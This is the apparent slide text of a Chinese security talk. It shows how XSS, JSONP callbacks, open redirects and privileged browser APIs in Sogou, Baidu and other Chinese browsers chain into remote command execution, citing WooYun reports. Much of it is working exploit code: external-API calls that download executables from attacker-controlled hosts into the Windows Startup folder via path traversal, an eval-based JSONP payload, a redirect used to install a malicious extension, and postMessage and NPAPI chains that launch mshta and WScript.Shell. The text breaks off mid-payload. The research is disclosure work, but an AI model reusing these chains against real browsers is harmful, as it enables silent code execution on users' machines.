从WEB脚本漏洞到客户端应用的
远程命令执行
@gainover
XSS、CSRF、SQLi …
水稻、microRNA、DNA methylation …
关于我
昵称： Gainover
团队： PKAV WEB安全团队 （双螺旋安全实验室）
标签：前端开发，十年生物，乌云，WEB安全
Javascript、 VBscript、Flash actionscript …..
一些老案例 。。。
浏览器 external API 设计不当 +  特权域边界绕过
攻击页面 -> XSS ->  se.360.cn ->  Install('ExtWebMail','1.1.0.
1013','360邮件通','http://www.wooyun.org/ExtWebmail.zi
p','3.1.0.8')
(2010年)
ActiveX 接口设计不当 （2007）
Browser Bug Hunting in 2012 
（Roberto Suggi Liverani / Scott Bell ）
特权域 （mx://）
maxthon.io （文件操作）
maxthon.program （执行程序）
攻击页面
浏览历史
RSS  功能
书签功能
XSS
（HITB2012 ）
应用程序
WEB脚本
功能接口
设计缺陷
命令执行
ActiveX 控件
扩展浏览器external对象
注入自定义功能对象
XSS
CSRF
URL跳转
SOP Bypass
…..
没有FUZZ、没有overflow 。。。
真相是：我不擅长！！
一些现在的案例
浏览器 作为用户的上网入口
大陆互联网厂商争相抢夺
陆续加入中 ….
这些浏览器占有大量的市场份额
为什么要研究这些浏览器？
以安全之名的浏览器：360安全浏览器、猎豹安全浏览器
（HITCON2012：大陆浏览器安全）
更多的浏览器是为用户提供更好的功能与体验！
他们的宣传口号往往是：
他们往往能更换
各种漂亮的皮肤：
他们往往提供了丰
富的浏览器扩展：
他们往往还是
“双核”浏览器：
然而，一些安全问题来了！
更换皮肤的功能实现：
http://xxx.browser.com/skin
browser://skin/
特权域：
浏览器内部
功能API
下载皮肤
写入磁盘
安装皮肤
搜狗浏览器
window.external.SkinCall("install", "cmd.exe", 0, 
"http://hongmei.me/cmd.exe", "instThmemeCallback");
皮肤地址
写入磁盘的皮肤名称
安装成功后的回调函数
cmd.exe    ../../../“开始”菜单/程序/启动/cmd.exe
(WooYun-2013-37211)
特权域：http://*.sogou.com/
XSS
window.external.StartRequest(1,"bdbrowser.skin.download","回调函数","{\"nam
e\":\"cmd.exe\",\"url\":\"http://192.168.1.105/testbaidu.exe\"}",window,"")
百度浏览器
(WooYun-2014-80438)
皮肤地址
cmd.exe    ../../../“开始”菜单/程序/启动/cmd.exe
写入本地的皮肤名称
特权域： （哪些域可以调用 external.StartRequest ?）
http://xapp.baidu.com/ 与 bdbrowser:// 均找不到XSS ！！
data: …… 
blob: …
var data='';
var blob=new Blob([data],{"type":"text/html"});
(function(){
var iframe=document.createElement("iframe");
iframe.src=URL.createObjectURL(blob);
document.body.appendChild(iframe);
})()
百度浏览器
(WooYun-2014-80910)
window.external.StartRequest(1,"bdbrowser.skin.download","回调函数","{\"nam
e\":\"cmd.exe\",\"url\":\"http://192.168.1.105/testbaidu.exe\"}",window,"")
皮肤地址
写入本地的皮肤名称
cmd.exe    ../../../“开始”菜单/程序/启动/cmd.exe
cmd.exe    ..//..//..//“开始”菜单/程序/启动/mm.js
皮肤地址  必须为 http://*.baidu.com/ 域名下的资源文件
找一个文件上传？
No,   只需要一个没有过滤 ( ) 的JSONP接口！
http://xapp.baidu.com/interface/lib.get_app_list_new?client=browser&cid=
&count=36&page=1&callback=eval(String.fromCharCode(118,97,..., 59));void
可能很难在百度上找到一个允许上传EXE文件的功能！
但很容易找到一个没有过滤( ) 的JSONP接口！
..//..//..//“开始”菜单/程序/启动/mm.js
扩展安装的功能实现：
http://xxx.browser.com/skin
browser://skin/
特权域：
浏览器内部
功能API
下载扩展
写入磁盘
安装皮肤
是否安装？
解压
百度浏览器
(WooYun-2014-80158)
window.external.StartRequest(222,"AppService.AppMarket.DownloadPack","(function(
id,res){alert(res)})","{\"ID\":\"111111\",\"UPDATE\":\"true\",\"URL\":\"http://x.com/
swf_collector.crx\"}",window,"");
扩展地址
是否是更新扩展操作
http://xapp.baidu.com/browserextension/single/sinaweibo/auth.php#access_toke
n=
特权域 XSS
不幸的是，XSS Auditor 会拦截这个DOM XSS !
寻找一个绕过 XSS Auditor 的方法？
可惜水平有限。。
双核浏览器？ 另外一个核是否会拦截该DOM XSS呢？
网银网站
ftp://
Trident Core
自动切换
external.StartRequest
恶意插件 (利用NPAPI去执行任意命令)
百度浏览器
(WooYun-2014-81309)
http://xapp.baidu.com/browserextension/single/tieba/tiebarslidebar/v_6-
0/tiebaslidebar-login-confirm.html#!f=aaaa&uid=vvvvv&uname=
这一次，我们首先拥有了一枚特权域的XSS！
window.external.StartRequest(222,"AppService.AppMarket.DownloadPack
","(function(id,res){console.log(res)})","{\"ID\":\"Silenter\",\"UPDATE\":\"f
alse\",\"URL\":\"http://dlsw.br.baidu.com/49411271abae81764cf268983c
95d9d7.crx\"}",window,"");
安装扩展的ID
安装扩展的URL：只能用 http://*.baidu.com/下的资源，以.crx结尾
上传一个 crx 到百度服务器？
找一个可控的JSONP接口？
无法构造出crx文件
其实，我们只需要一个302跳转！！
http://newsletter.baidu.com/u.html?stime=1403762195&uid=baidu&eid=13
09383&email=PI:EMAIL&tlid=259&stid=1672&thid=259&url=IzEjaH
R0cDovLzE5Mi4xNjguMS4xMDUvRXZpbFBsdWdpbi5jcng=&.crx
浏览器扩展的缺陷带来的安全问题
以 chrome 浏览器的实现作为安全标准
特权域：chrome://
插件域：chrome-extension://
location.href="chrome-
extension://egdbbgfejcjbhflpflljpajafhiffnoi/xxxxxxxxxx.html";
location.href="chrome://history/"
搜狗浏览器
(WooYun-2014-83537)
se://              se-extension://
location.href="se-extension://xxxxxxx/yyyyyyyyy.html";
允许从 http协议
直接跳转至
se-extension协议
se-extension://ext-1055834318/signin.html?app=test&code=javascript:alert(1)
一个搜狗浏览器自带扩展页面的DOM XSS
搜狗浏览器
自带扩展 1
自带扩展 2
自带扩展 3
DOM XSS
NPAPI
…….
攻击
页面
location.href
iframe
embed1.startExe("mshta javas
cript:(new/**/ActiveXObject('
WScript.Shell').run('calc.exe'));
window.moveTo(-1000,-1000);
window.close();")
访问PoC页面后，执行计算器
搜狗浏览器
(WooYun-2014-84110)
/(http|ftp|https):\/\/[\w\- …………………])?/.test(url)
缺个 ^
code=javascript:alert(1);//http://www.baidu.com/
绕过修复措施
自带扩展 1
自带扩展 2
DOM XSS
攻击
页面
iframe
NPAPI
w=window.open("..")
w.document.getElement
ById("embed1").startExe
搜狗浏览器
(WooYun-2014-85567)
location.href = "se-extension://ext-1055834318/signin.html";
跳转到一个about:blank页面
换个姿势 （在sogou.com域下测试）：
w = window.open("se-extension://ext-1055834318/signin.html ");
依然打开一个about:blank页面，没戏啦？
setTimeout(function(){
w.location.href='se-extension://ext-1055834318/signin.html';
},500);
500毫秒后，又是一条好汉！
绕过弹窗拦截：
Mydomain.com
w = window.open("se-extension://ext-1055834318/signin.html ");
http://player.mbox.sogou.com/FlashMP3Player.swf?isFlashReady=function()
{if(!window.x){alert(1);window.x=1;}}
*.sogou.com
OK
Flash Xss on player.mbox.sogou.com (报告一年未修复)
se-extension://ext740107210/html/balloon.html
寻找到另一个DOM XSS：
http://img.wan.sogou.com/cdn/gamehelperV0.3/v1.0.5/balloon/main.js
onmessage  e.data.url   sogouExplorer.tabs.create (创建新的tabpage)
w = window.open("se-extension://ext740107210/html/balloon.html");
已经实现打开balloon页面
利用postMessage传递恶意消息
w.postMessage({
"cmd":"BalloonStartGame",
"url":"恶意URL"
});
这有什么用呢？
打开一个
页面，吓唬吓唬人？
将恶意 URL 置为 javascript: alert(1)
显然这样的恶意还不够！
即执行： sogouExplorer.tabs.create({url:"javascript:alert(1)"})
相当于在当前页面里执行 alert(1)
这意味着：我们得到了一个 se-extension://ext740107210/html/
balloon.html 页面上的XSS
从backgroundPage中获得NPAPI对象并执行命令
自带扩展
Background Page
View Page
w = sogouExplorer.runti
me.getBackgroundPage()
w.document.getElementB
yId('embed1').startExe(…)
绕过 startExe 的改变
startExe("命令路径",回调函数)
startExe("命令目录路径"+sogouminigamepacker.exe, "参数", 回调函数)
calc.exe
sogouminigamepacker.exe
参数里不能带exe
calc sogouminigamepacker.exe
CreateProcess(NULL, lpCommandLine,..)
CreateProcess(NULL, "calc sogouminigamepacker.exe 其它参数 ", …….)
没有引号引起来！！
w.postMessage({"cmd":"BalloonStartGame","url":"javascript:sogouExplorer.runtim
e.getBackgroundPage().document.getElementById('embed1').startExe(\"mshta ja
vascript:(new/**/ActiveXObject('WScript.Shell').run('calc'));window.moveTo(-100
0,-1000);window.close(); //\",\"\",function(){console.log(arguments)});"},"*");
“扩展静默安装”带来的危害
不少浏览器均提供了静默安装扩展的功能：
用途？ 可能是用于“静静”地安装浏览器厂商提供的“内部”扩展！
猎豹浏览器
external.NativeInstallExtensions(["fpmcdbknonpdbngoboglidihcbfjcaep"]);
扩展在猎豹应用市场里的ID
搜狗浏览器
window.external.extension("installExtFromSidebarBox", "com.qq.Accoun
tProtect", "1.0.6", "test", '-1', 'undefined', 'undefined', "function(){consol
e.log(arguments);}");
扩展在搜狗应用市场里的ID
QQ浏览器
window.external.extension.installExtension("{CD36E3DB-304A-48EF-A8A2
-D873F608D2AE}","http://*.qq.com/*.qrx","8.0.1.19",function(){alert("in
stall ok");});
扩展地址
猎豹浏览器
(WooYun-2015-97654)
在应用市场搜索“启动”
好视通视频会议启动插件
"public": true
这意味着该插件的功能在任意页
面均可被调用！
这个 DLL 有哪些功能呢？
这Run2函数是一个下载并执行的API接口！
攻击页面  http://tuan.duba.com/cate
gory/?city_code=\u0022\u
003e\u003cimg%20src=1%
20onerror=alert\u00281\u